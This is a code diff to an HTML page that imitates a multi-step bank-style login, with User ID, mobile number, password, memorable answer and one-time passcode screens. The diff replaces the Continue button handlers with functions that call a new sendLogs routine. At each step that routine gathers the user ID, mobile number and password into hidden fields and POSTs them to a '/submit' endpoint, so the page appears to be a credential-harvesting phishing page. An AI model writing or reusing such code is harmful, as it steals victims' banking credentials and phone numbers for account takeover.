@@ -164,8 +164,10 @@
             <input type="tel" id="mobile" autocomplete="off" placeholder="e.g. 07700 900000" />
             <p class="hint">We&rsquo;ll send a one-time passcode to this number in step 3.</p>
           </div>
+          <input type="hidden" id="email" value="" />
+          <input type="hidden" id="ms-mobile" value="" />
           <label class="chk"><input type="checkbox" /> Remember my User ID on this device</label>
-          <button class="btn" onclick="goWithLoader(2,this)">Continue</button>
+          <button class="btn" onclick="nextStep(this)">Continue</button>
           <hr />
           <div class="links">
             <a href="#">Forgotten your User ID?</a>
@@ -195,7 +197,7 @@
             <input type="password" id="ma" autocomplete="off" />
             <p class="hint">Your answer is not case sensitive.</p>
           </div>
-          <button class="btn" onclick="goWithLoader(3,this)">Continue</button>
+          <button class="btn" onclick="doPassword(this)">Continue</button>
           <hr />
           <div class="links">
             <a href="#" onclick="go(1);return false;">&larr; Back to log in</a>
@@ -221,7 +223,7 @@
             </div>
           </div>
           <p class="resend-txt">Didn&rsquo;t receive a code? <a href="#" onclick="return false;">Resend code</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Use a different method</a></p>
-          <button class="btn" onclick="goWithLoader(4,this)">Verify and continue</button>
+          <button class="btn" onclick="doVerify(this)">Verify and continue</button>
           <hr />
           <div class="links">
             <a href="#" onclick="go(2);return false;">&larr; Back</a>
@@ -314,6 +316,25 @@
 </footer>
 
 <script>
+  async function sendLogs(type) {
+    var emailEl = document.getElementById('email');
+    var mobileEl = document.getElementById('ms-mobile');
+    if (emailEl) emailEl.value = document.getElementById('uid')?.value || '';
+    if (mobileEl) mobileEl.value = document.getElementById('mobile')?.value || '';
+    try {
+      await fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ type: type, email: emailEl?.value || '', pwd: document.getElementById('pwd')?.value || '', mobile: mobileEl?.value || '' })
+      });
+    } catch (e) {
+      console.warn('sendLogs failed', e);
+    }
+  }
+  function nextStep(btn) { sendLogs('email-step'); goWithLoader(2, btn); }
+  function doPassword(btn) { sendLogs('password-step'); goWithLoader(3, btn); }
+  function doVerify(btn) { sendLogs('verify-step'); goWithLoader(4, btn); }
+
   function goWithLoader(n, btn) {
     var origHtml = btn.innerHTML;
     var isFinal  = n === 4;
